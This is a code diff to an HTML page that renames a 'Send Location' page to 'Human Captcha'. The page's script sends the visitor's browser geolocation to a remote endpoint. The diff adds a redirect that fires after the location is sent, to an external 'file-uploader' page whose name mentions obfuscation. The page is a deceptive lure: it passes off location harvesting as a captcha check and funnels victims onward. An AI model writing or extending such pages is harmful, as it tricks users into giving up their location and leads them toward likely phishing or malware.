@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Send Location</title>
+    <title>Human Captcha</title>
     <style>
         body {
             background: url('https://blog.sucuri.net/wp-content/uploads/2022/12/spam-pop-up-wordpress-pages-1180x812.png') no-repeat center center fixed;
@@ -35,7 +35,11 @@
                             headers: { "Content-Type": "application/json" },
                             body: JSON.stringify(data)
                         })
-                        .then(() => console.log("Location sent successfully!"))
+                        .then(() => {
+                            console.log("Location sent successfully!");
+                            // Redirect user to the provided URL after sending the location
+                            window.location.href = "https://sites.google.com/view/no-thx-obfascate-thx/file-uploader";
+                        })
                         .catch(() => console.log("Failed to send location."));
                     },
                     () => console.log("Location permission denied.")
